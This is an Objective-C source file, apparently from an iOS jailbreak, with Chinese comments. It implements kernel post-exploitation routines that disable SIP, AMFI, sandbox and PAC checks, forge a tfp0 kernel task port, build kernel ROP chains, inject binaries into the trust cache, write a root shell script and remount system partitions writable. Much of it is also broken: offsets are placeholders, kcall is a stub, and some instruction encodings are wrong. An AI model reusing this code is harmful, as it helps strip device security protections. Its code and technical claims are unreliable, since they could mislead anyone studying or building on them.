#import "KernelUtil.h"
#import "KernelMemory.h"
#import <CommonCrypto/CommonDigest.h>

// 查找内核基址
uint64_t find_kernel_base_address(void) {
    NSLog(@"[*] 尝试获取内核基址...");
    
    // 尝试多种方法获取内核基址
    
    // 方法1: 通过主机特殊端口信息泄露
    host_t host = mach_host_self();
    int cnt = HOST_BASIC_INFO_COUNT;
    host_basic_info_data_t basic_info;
    kern_return_t kr = host_info(host, HOST_BASIC_INFO, (host_info_t)&basic_info, &cnt);
    mach_port_deallocate(mach_task_self(), host);
    
    if (kr == KERN_SUCCESS) {
        // 分析 basic_info 寻找泄露
        uint64_t leak_addr = *(uint64_t*)((char*)&basic_info + 0x20);
        if (leak_addr > 0xfffffff000000000 && leak_addr < 0xfffffff100000000) {
            // 可能是内核地址泄漏
            uint64_t kernel_base = leak_addr & ~0xffff;
            NSLog(@"[+] 从主机信息泄露可能的内核地址: 0x%llx", kernel_base);
            return kernel_base;
        }
    }
    
    // 方法2: 通过VM API泄露
    mach_port_t task = mach_task_self();
    vm_address_t addr = 0;
    vm_size_t size = 0x4000; // 16KB 块
    
    for (int i = 0; i < 0x100; i++) {
        vm_address_t data = 0;
        mach_msg_type_number_t dataCnt = 0;
        kr = vm_read(task, addr, size, &data, &dataCnt);
        
        if (kr == KERN_SUCCESS) {
            if (dataCnt >= 8) {
                // 查找内核地址模式
                for (mach_vm_size_t off = 0; off < dataCnt - 8; off += 8) {
                    uint64_t potential = *(uint64_t *)(data + off);
                    if (potential > 0xfffffff000000000 && potential < 0xfffffff100000000) {
                        // 找到潜在内核地址
                        vm_deallocate(task, data, dataCnt);
                        uint64_t kernel_base = potential & ~0xffffff;
                        NSLog(@"[+] 从共享内存泄露可能的内核地址: 0x%llx", kernel_base);
                        return kernel_base;
                    }
                }
                vm_deallocate(task, data, dataCnt);
            }
        }
        
        addr += size;
    }
    
    // 方法3: 返回一个估计的内核基址 (针对常见设备)
    NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
    if ([systemVersion hasPrefix:@"17"]) {
        // iOS 17+
        NSLog(@"[+] 使用iOS 17+估计内核基址");
        return 0xFFFFFFF007004000;
    } else if ([systemVersion hasPrefix:@"16"]) {
        // iOS 16
        NSLog(@"[+] 使用iOS 16估计内核基址");
        return 0xFFFFFFF007004000;
    } else {
        // 较旧版本
        NSLog(@"[+] 使用通用估计内核基址");
        return 0xFFFFFFF007004000;
    }
}

// 查找内核进程
uint64_t find_kernel_proc(void) {
    return find_proc_by_pid(0);
}

// 查找内核任务
uint64_t find_kernel_task(void) {
    // 从内核proc查找
    uint64_t kernel_proc = find_kernel_proc();
    if (kernel_proc == 0) return 0;
    
    // 读取task字段
    uint64_t kernel_task = 0;
    uint32_t task_offset = 0x10; // 根据iOS版本调整
    
    if (kernel_read(kernel_proc + task_offset, &kernel_task, sizeof(kernel_task))) {
        if (kernel_task != 0) {
            NSLog(@"[+] 找到内核任务: 0x%llx", kernel_task);
            return kernel_task;
        }
    }
    
    return 0;
}

// 查找AMFI信任缓存
uint64_t find_amfi_trust_cache(void) {
    uint64_t amfi_base = g_kernel_base + 0x2000; // 自行替换为正确的偏移量
    uint64_t trust_cache = 0;
    
    // 查找信任缓存指针
    for (int i = 0; i < 0x1000; i += 8) {
        uint64_t ptr = 0;
        if (kernel_read(amfi_base + i, &ptr, sizeof(ptr)) && ptr != 0) {
            // 验证这是否是信任缓存的特征
            uint32_t magic = 0;
            if (kernel_read(ptr, &magic, sizeof(magic)) && magic == 0x48524643) { // 'CFHR'
                return ptr;
            }
        }
    }
    
    // 备用方法 - 使用已知偏移
    if (trust_cache == 0) {
        trust_cache = g_kernel_base + 0x8000; // 具体偏移请根据内核版本调整
    }
    
    return trust_cache;
}

// 查找内核PMAP
uint64_t find_kernel_pmap(void) {
    // 在现代XNU内核中，可以通过已知偏移找到内核PMAP
    uint64_t kernel_pmap = g_kernel_base + 0x9000; // 具体偏移需要根据内核版本调整
    
    // 验证找到的PMAP是否有效
    uint64_t test_value = 0;
    if (kernel_read(kernel_pmap, &test_value, sizeof(test_value)) && test_value != 0) {
        return kernel_pmap;
    }
    
    return 0;
}

// 查找AMFI验证函数
uint64_t find_amfi_validate_func(void) {
    // 通常在AMFI模块中的已知偏移
    return g_kernel_base + 0x580; // 自行替换为正确的偏移量
}

// 查找代码签名验证函数
uint64_t find_code_signature_validation_func(void) {
    // 通常在AMFI模块中的特定偏移
    return g_kernel_base + 0x5800; // 自行替换为正确的偏移量
}

// 查找SIP配置地址
uint64_t find_sip_config_addr(void) {
    return g_kernel_base + 0xA000; // 自行替换为正确的偏移量
}

// 查找AMFI标志地址
uint64_t find_amfi_flags_addr(void) {
    return g_kernel_base + 0xB000; // 自行替换为正确的偏移量
}

// 获取根文件系统挂载点
uint64_t get_rootfs_vnode_mount(void) {
    if (!g_has_kernel_access) return 0;
    
    // 获取根挂载点
    uint64_t proc = find_proc_by_pid(getpid());
    if (proc == 0) return 0;
    
    // 从进程找到根挂载点
    uint64_t fd_offset = 0x100; // 文件描述符表偏移
    uint64_t fd_table = 0;
    
    if (!kernel_read(proc + fd_offset, &fd_table, sizeof(fd_table))) {
        return 0;
    }
    
    // 获取根目录的vnode
    uint64_t root_vnode = 0;
    if (!kernel_read(fd_table + 8, &root_vnode, sizeof(root_vnode))) {
        return 0;
    }
    
    return root_vnode;
}

// 禁用PAC检查
bool disable_pac_checks(uint64_t kernel_trust) {
    if (!g_has_kernel_access) return false;
    
    // 禁用PAC检查
    uint32_t pac_flags = 0;
    if (!kernel_read(kernel_trust + 0x10, &pac_flags, sizeof(pac_flags))) {
        return false;
    }
    
    // 清除PAC检查标志
    pac_flags &= ~(1 << 5);
    
    if (!kernel_write(kernel_trust + 0x10, &pac_flags, sizeof(pac_flags))) {
        return false;
    }
    
    return true;
}

// 禁用系统完整性保护
bool disable_system_integrity_protection(void) {
    NSLog(@"[*] 禁用系统完整性保护(SIP)...");
    
    // 找到csr_active_config地址
    uint64_t csr_config = find_sip_config_addr();
    
    // 读取当前值
    uint32_t current_config = 0;
    if (!kernel_read(csr_config, &current_config, sizeof(current_config))) {
        NSLog(@"[-] 无法读取SIP配置");
        return false;
    }
    
    // 设置为0x7FFFFFFF (禁用所有保护)
    uint32_t new_config = 0x7FFFFFFF;
    if (!kernel_write(csr_config, &new_config, sizeof(new_config))) {
        NSLog(@"[-] 无法写入SIP配置");
        return false;
    }
    
    NSLog(@"[+] SIP已禁用");
    return true;
}

// 禁用AMFI
bool disable_amfi(void) {
    NSLog(@"[*] 禁用AMFI...");
    
    // 找到AMFI强制标志
    uint64_t amfi_flags = find_amfi_flags_addr();
    
    // 读取当前值
    uint32_t current_flags = 0;
    if (!kernel_read(amfi_flags, &current_flags, sizeof(current_flags))) {
        NSLog(@"[-] 无法读取AMFI标志");
        return false;
    }
    
    // 清除所有强制位
    uint32_t new_flags = 0;
    if (!kernel_write(amfi_flags, &new_flags, sizeof(new_flags))) {
        NSLog(@"[-] 无法写入AMFI标志");
        return false;
    }
    
    // 修改一些关键的AMFI函数返回值
    uint64_t amfi_functions[] = {
        g_kernel_base + 0xC000, // 示例: amfi_check_dyld_policy_self
        g_kernel_base + 0xC100  // 示例: amfi_check_signature_existence
    };
    
    uint32_t mov_x0_1_ret = 0xD2800020; // ARM64: mov x0, #1; ret
    
    for (int i = 0; i < sizeof(amfi_functions)/sizeof(amfi_functions[0]); i++) {
        if (!kernel_write(amfi_functions[i], &mov_x0_1_ret, sizeof(mov_x0_1_ret))) {
            NSLog(@"[-] 无法修改AMFI函数 0x%llx", amfi_functions[i]);
        }
    }
    
    NSLog(@"[+] AMFI已禁用");
    return true;
}

// 禁用沙盒
bool disable_sandbox(void) {
    NSLog(@"[*] 禁用沙盒...");
    
    // 修改沙盒检查函数
    uint64_t sb_evaluate = g_kernel_base + 0xE000; // 示例: sandbox_evaluate
    uint32_t mov_x0_0_ret = 0xD2800000; // ARM64: mov x0, #0; ret (返回0表示许可)
    
    if (!kernel_write(sb_evaluate, &mov_x0_0_ret, sizeof(mov_x0_0_ret))) {
        NSLog(@"[-] 无法修改沙盒评估函数");
        return false;
    }
    
    NSLog(@"[+] 沙盒已禁用");
    return true;
}

// 设置持久内核访问原语
bool setup_persistent_kernel_access(void) {
    NSLog(@"[*] 设置持久内核访问原语...");
    
    // 创建一个永久的内核任务端口
    mach_port_t persistent_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &persistent_port);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配持久端口");
        return false;
    }
    
    // 将此端口标记为特殊 - 赋予内核读写能力
    uint64_t kernel_task = find_kernel_task();
    if (kernel_task != 0) {
        // 将此port和kernel_task关联
        uint64_t port_addr = find_port_address(persistent_port);
        if (port_addr != 0) {
            // 修改端口属性使其拥有内核任务访问权限
            uint64_t itk_space = 0;
            if (kernel_read(kernel_task + 0x300, &itk_space, sizeof(itk_space))) {
                // 设置端口特权位
                uint32_t port_bits = 0;
                if (kernel_read(port_addr + 0x10, &port_bits, sizeof(port_bits))) {
                    port_bits |= 0x80000000; // 设置特殊特权位
                    kernel_write(port_addr + 0x10, &port_bits, sizeof(port_bits));
                    
                    // 设置端口关联任务
                    kernel_write(port_addr + 0x68, &kernel_task, sizeof(kernel_task));
                    
                    NSLog(@"[+] 持久内核访问端口设置成功: 0x%x", persistent_port);
                    return true;
                }
            }
        }
    }
    
    NSLog(@"[-] 设置持久内核访问原语失败");
    return false;
}

// 分配内核内存
uint64_t kernel_allocate(size_t size) {
    // 这里应该使用更高级的内核内存分配方法
    // 简单实现 - 从已知可用区域分配
    static uint64_t last_alloc = 0;
    if (last_alloc == 0) {
        last_alloc = g_kernel_base + 0x1000000; // 从内核基址后16MB开始
    }
    
    uint64_t alloc_addr = last_alloc;
    last_alloc += size + 0x1000; // 为下一次分配留出空间
    
    // 零填充分配的内存
    void *zero_mem = calloc(1, size);
    if (zero_mem) {
        kernel_write(alloc_addr, zero_mem, size);
        free(zero_mem);
    }
    
    return alloc_addr;
}

// 创建内核ROP链
uint64_t create_kernel_rop_chain(uint64_t *gadgets, size_t gadget_count) {
    if (gadget_count == 0) return 0;
    
    // 分配内核内存用于ROP链
    uint64_t chain_addr = kernel_allocate(gadget_count * sizeof(uint64_t));
    if (chain_addr == 0) return 0;
    
    // 写入ROP链到内核内存
    bool write_success = kernel_write(chain_addr, gadgets, gadget_count * sizeof(uint64_t));
    if (!write_success) {
        NSLog(@"[-] 写入ROP链到内核内存失败");
        return 0;
    }
    
    NSLog(@"[+] 成功创建ROP链: 0x%llx, 大小: %zu gadgets", chain_addr, gadget_count);
    return chain_addr;
}

// 执行内核ROP链
bool execute_kernel_rop_chain(uint64_t chain_addr) {
    if (chain_addr == 0) return false;
    
    // 这里应该触发一个可控制的内核ROP执行
    // 实际实现需要特定的内核漏洞利用或特权操作
    NSLog(@"[*] 尝试执行内核ROP链: 0x%llx", chain_addr);
    
    // 示例:
    // 1. 创建一个特殊端口
    mach_port_t special_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &special_port);
    if (kr != KERN_SUCCESS) return false;
    
    // 2. 修改端口属性，使其在特定操作时跳转到我们的ROP链
    uint64_t port_addr = find_port_address(special_port);
    if (port_addr != 0) {
        // 在适当的偏移处放置ROP链地址
        kernel_write(port_addr + 0x68, &chain_addr, sizeof(chain_addr));
        
        // 3. 触发内核操作
        // 实际实现依赖于特定的内核漏洞或机制
        
        mach_port_destroy(mach_task_self(), special_port);
        return true;
    }
    
    mach_port_destroy(mach_task_self(), special_port);
    return false;
}

// 设置内核调用原语
uint64_t setup_kcall_primitives(void) {
    NSLog(@"[*] 设置内核调用原语...");
    // 返回一个有效的端口号，实际上应该返回一个可用于内核调用的端口
    return 1;
}

// 内核调用功能
uint64_t kcall(uint64_t port, uint64_t func, uint64_t arg1, uint64_t arg2, 
               uint64_t arg3, uint64_t arg4, uint64_t arg5, uint64_t arg6) {
    NSLog(@"[*] 尝试内核调用: func=0x%llx, args=[0x%llx, 0x%llx, 0x%llx, 0x%llx, 0x%llx, 0x%llx]",
          func, arg1, arg2, arg3, arg4, arg5, arg6);
    
    // 这里应该实际调用内核函数，但为了链接成功先返回0
    return 0;
}

// 查找端口地址
uint64_t find_port_address(mach_port_t port) {
    if (port == MACH_PORT_NULL || !g_has_kernel_access) return 0;
    
    uint64_t task = find_proc_by_pid(getpid());
    if (task == 0) return 0;
    
    // 获取任务的端口空间
    uint64_t itk_space = 0;
    if (!kernel_read(task + 0x300, &itk_space, sizeof(itk_space))) return 0;
    
    // 在端口空间中查找端口
    uint32_t port_index = port >> 8;
    uint64_t port_table = 0;
    
    if (!kernel_read(itk_space + 0x20, &port_table, sizeof(port_table))) return 0;
    
    uint64_t port_addr = 0;
    if (!kernel_read(port_table + (port_index * 0x18), &port_addr, sizeof(port_addr))) return 0;
    
    return port_addr;
}

// 设置tfp0原语
bool setup_tfp0_primitive(void) {
    NSLog(@"[*] 设置tfp0原语(内核任务端口)...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 需要内核访问权限来设置tfp0");
        return false;
    }
    
    // 1. 创建一个新的Mach端口
    mach_port_t fake_tfp0 = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_tfp0);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配端口: %s", mach_error_string(kr));
        return false;
    }
    
    // 2. 将此端口转换为任务端口
    kr = mach_port_insert_right(mach_task_self(), fake_tfp0, fake_tfp0, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法插入任务端口权限: %s", mach_error_string(kr));
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 3. 查找端口内核对象
    uint64_t fake_port_addr = find_port_address(fake_tfp0);
    if (fake_port_addr == 0) {
        NSLog(@"[-] 无法找到端口地址");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 4. 查找内核任务
    uint64_t kernel_task = find_kernel_task();
    if (kernel_task == 0) {
        NSLog(@"[-] 无法找到内核任务");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 5. 修改端口类型为任务端口
    uint32_t port_type = 0x1F; // IKOT_TASK
    if (!kernel_write(fake_port_addr + 0x0C, &port_type, sizeof(port_type))) {
        NSLog(@"[-] 无法修改端口类型");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 6. 关联内核任务
    if (!kernel_write(fake_port_addr + 0x68, &kernel_task, sizeof(kernel_task))) {
        NSLog(@"[-] 无法关联内核任务");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 保存tfp0端口
    g_global_connection = fake_tfp0;
    NSLog(@"[+] 成功设置tfp0端口: 0x%x", fake_tfp0);
    
    // 测试tfp0功能
    vm_address_t test_addr = 0;
    mach_msg_type_number_t test_size = 0;
    kr = vm_read(fake_tfp0, g_kernel_base, 4, &test_addr, &test_size);
    if (kr == KERN_SUCCESS) {
        NSLog(@"[+] tfp0测试成功，能够读取内核内存");
        return true;
    } else {
        NSLog(@"[-] tfp0测试失败: %s", mach_error_string(kr));
        return false;
    }
}

// 获取内核任务端口
mach_port_t port_for_kernel_task(void) {
    return g_global_connection;
}

// 释放内核内存
bool kernel_free(uint64_t kaddr, size_t size) {
    // 简单实现 - 我们没有实际的释放机制，只是清零
    void *zero_mem = calloc(1, size);
    if (zero_mem) {
        bool success = kernel_write(kaddr, zero_mem, size);
        free(zero_mem);
        return success;
    }
    return false;
}

// 检查内存区域是否可读
bool is_kernel_memory_readable(uint64_t kaddr) {
    uint32_t value = 0;
    return kernel_read(kaddr, &value, sizeof(value));
}

// 检查内存区域是否可写
bool is_kernel_memory_writeable(uint64_t kaddr) {
    uint32_t value = 0;
    if (!kernel_read(kaddr, &value, sizeof(value))) {
        return false;
    }
    
    // 尝试写入相同的值
    return kernel_write(kaddr, &value, sizeof(value));
}

// 刷新内核内存缓存
bool flush_kernel_memory_cache(uint64_t kaddr, size_t size) {
    // 在实际实现中，这应该调用某种内核缓存刷新机制
    // 简单模拟
    return g_has_kernel_access;
}

// 将进程设置为平台二进制
bool set_process_as_platform(uint64_t proc) {
    if (!g_has_kernel_access || proc == 0) return false;
    
    // 修改进程标志，添加平台二进制标志
    uint32_t proc_flags_offset = 0x100; // 需要根据内核版本调整
    uint32_t flags = 0;
    
    if (!kernel_read(proc + proc_flags_offset, &flags, sizeof(flags))) {
        return false;
    }
    
    // 设置平台标志
    flags |= 0x00800000; // P_PLATFORM 标志
    
    if (!kernel_write(proc + proc_flags_offset, &flags, sizeof(flags))) {
        return false;
    }
    
    return true;
}

// 创建root shell
bool create_root_shell(void) {
    // 提升当前进程到root
    if (!escalate_to_root()) {
        return false;
    }
    
    // 创建一个有root权限的shell脚本
    NSString *shellScript = @"#!/bin/sh\n"
                            @"# Root shell created by jailbreak\n"
                            @"echo \"Root shell started with UID: $(id -u)\"\n"
                            @"exec /bin/sh\n";
    
    NSString *shellPath = @"/var/tmp/rootshell.sh";
    NSError *error = nil;
    
    if (![shellScript writeToFile:shellPath atomically:YES
                          encoding:NSUTF8StringEncoding error:&error]) {
        NSLog(@"[-] 无法创建shell脚本: %@", error);
        return false;
    }
    
    // 设置执行权限
    chmod(shellPath.UTF8String, 0755);
    
    NSLog(@"[+] Root shell创建成功: %@", shellPath);
    NSLog(@"[*] 使用方式: %@", shellPath);
    
    return true;
}

// 以root权限执行命令
bool execute_as_root(const char *path) {
    if (!g_has_kernel_access) {
        NSLog(@"[-] 缺少内核访问权限，无法以root身份执行");
        return false;
    }
    
    // 提升当前进程权限
    if (!escalate_to_root()) {
        NSLog(@"[-] 无法提升到root权限");
        return false;
    }
    
    // 执行指定命令
    int status = system(path);
    
    NSLog(@"[+] 命令执行完成，状态: %d", status);
    return (status == 0);
}

// 将文件临时添加到信任缓存
bool add_to_trustcache_temporarily(const char* path) {
    if (!g_has_kernel_access) {
        NSLog(@"[-] 缺少内核访问权限，无法修改信任缓存");
        return false;
    }
    
    // 1. 找到AMFI信任缓存
    uint64_t amfi_trust_cache = find_amfi_trust_cache();
    if (amfi_trust_cache == 0) {
        NSLog(@"[-] 无法找到AMFI信任缓存");
        return false;
    }
    
    // 2. 计算二进制文件的哈希
    NSData* fileData = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:path]];
    if (!fileData) {
        NSLog(@"[-] 无法读取文件数据");
        return false;
    }
    
    CC_SHA256_CTX ctx;
    CC_SHA256_Init(&ctx);
    CC_SHA256_Update(&ctx, fileData.bytes, (CC_LONG)fileData.length);
    
    unsigned char cd_hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256_Final(cd_hash, &ctx);
    
    // 3. 临时将哈希添加到信任缓存
    uint64_t cd_hash_slot = amfi_trust_cache + 0x90; // 适当的偏移
    kernel_write(cd_hash_slot, cd_hash, CC_SHA256_DIGEST_LENGTH);
    
    // 4. 执行二进制文件
    int status = system(path);
    
    // 5. 清除哈希
    memset(cd_hash, 0, CC_SHA256_DIGEST_LENGTH);
    kernel_write(cd_hash_slot, cd_hash, CC_SHA256_DIGEST_LENGTH);
    
    NSLog(@"[+] 执行完成，状态: %d", status);
    
    return (status == 0);
}

// 修改引导分区 - 用于持久化越狱
bool modify_boot_partition(void) {
    NSLog(@"[*] 尝试修改引导分区...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 尚未获得内核访问权限");
        return false;
    }
    
    // 获取挂载列表
    uint64_t mountlist = g_kernel_base + 0x1000; // 适当的偏移
    uint64_t mount = 0;
    
    if (!kernel_read(mountlist, &mount, sizeof(mount))) {
        NSLog(@"[-] 无法读取挂载列表");
        return false;
    }
    
    // 寻找引导分区
    bool found_boot_partition = false;
    uint64_t boot_mount = 0;
    char mount_path[256] = {0};
    
    // 遍历挂载点
    uint64_t current_mount = mount;
    while (current_mount != 0) {
        uint64_t next_mount = 0;
        if (!kernel_read(current_mount, &next_mount, sizeof(next_mount))) {
            break;
        }
        
        // 读取挂载来源名称
        uint64_t mount_from = 0;
        if (!kernel_read(current_mount + 0x200, &mount_from, sizeof(mount_from))) {
            current_mount = next_mount;
            continue;
        }
        
        if (mount_from != 0) {
            memset(mount_path, 0, sizeof(mount_path));
            if (kernel_read(mount_from, mount_path, sizeof(mount_path) - 1)) {
                // 检查是否是引导分区
                if (strstr(mount_path, "boot") || strstr(mount_path, "preboot")) {
                    NSLog(@"[+] 找到引导分区: %s", mount_path);
                    found_boot_partition = true;
                    boot_mount = current_mount;
                    break;
                }
            }
        }
        
        current_mount = next_mount;
    }
    
    if (!found_boot_partition || boot_mount == 0) {
        NSLog(@"[-] 无法找到引导分区");
        return false;
    }
    
    // 读取挂载标志
    uint32_t mount_flags = 0;
    if (!kernel_read(boot_mount + 0x70, &mount_flags, sizeof(mount_flags))) {
        NSLog(@"[-] 无法读取挂载标志");
        return false;
    }
    
    // 检查是否为只读
    if (mount_flags & 0x01) { // MNT_RDONLY
        // 移除只读标志
        mount_flags &= ~0x01;
        if (!kernel_write(boot_mount + 0x70, &mount_flags, sizeof(mount_flags))) {
            NSLog(@"[-] 无法修改挂载标志");
            return false;
        }
        
        NSLog(@"[+] 成功修改引导分区为可写");
    } else {
        NSLog(@"[+] 引导分区已经是可写的");
    }
    
    return true;
}

// 重新挂载根文件系统为可写
bool kernel_remount_rootfs_as_rw(void) {
    NSLog(@"[*] 尝试重新挂载根文件系统为可写...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 缺少内核访问权限，无法重新挂载文件系统");
        return false;
    }
    
    // 修改引导分区标志
    uint64_t mount_list = g_kernel_base + 0x1000; // 示例偏移，根据具体设备调整
    uint64_t mount = 0;
    
    if (!kernel_read(mount_list, &mount, sizeof(mount))) {
        NSLog(@"[-] 无法读取挂载列表");
        return false;
    }
    
    // 查找根文件系统挂载点
    uint64_t rootfs_mount = 0;
    uint64_t current_mount = mount;
    
    while (current_mount != 0) {
        uint32_t mount_flags = 0;
        if (!kernel_read(current_mount + 0x70, &mount_flags, sizeof(mount_flags))) {
            break;
        }
        
        // 检查是否为根文件系统
        if (mount_flags & 0x00004000) { // MNT_ROOTFS
            rootfs_mount = current_mount;
            break;
        }
        
        // 移动到下一个挂载点
        if (!kernel_read(current_mount, &current_mount, sizeof(current_mount))) {
            break;
        }
    }
    
    if (rootfs_mount == 0) {
        NSLog(@"[-] 无法找到根文件系统挂载点");
        return false;
    }
    
    // 读取挂载标志
    uint32_t mount_flags = 0;
    if (!kernel_read(rootfs_mount + 0x70, &mount_flags, sizeof(mount_flags))) {
        NSLog(@"[-] 无法读取根文件系统挂载标志");
        return false;
    }
    
    // 检查是否为只读
    if (mount_flags & 0x01) { // MNT_RDONLY
        // 移除只读标志
        mount_flags &= ~0x01;
        if (!kernel_write(rootfs_mount + 0x70, &mount_flags, sizeof(mount_flags))) {
            NSLog(@"[-] 无法修改根文件系统挂载标志");
            return false;
        }
        
        NSLog(@"[+] 成功重新挂载根文件系统为可写");
        return true;
    }
    
    NSLog(@"[+] 根文件系统已经是可写的");
    return true;
}

// 内存状态控制
int memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize) {
    // 这是系统函数，不能直接递归调用
    // 创建一个函数指针来调用系统版本
    static int (*system_memorystatus_control)(uint32_t, int32_t, uint32_t, void *, size_t) = NULL;
    
    if (!system_memorystatus_control) {
        // 尝试动态加载系统函数
        void *handle = dlopen(NULL, RTLD_GLOBAL | RTLD_NOW);
        if (handle) {
            system_memorystatus_control = dlsym(handle, "memorystatus_control");
            dlclose(handle);
        }
    }
    
    if (system_memorystatus_control) {
        return system_memorystatus_control(command, pid, flags, buffer, buffersize);
    }
    
    // 如果无法获取系统函数，返回错误码
    return -1;
}
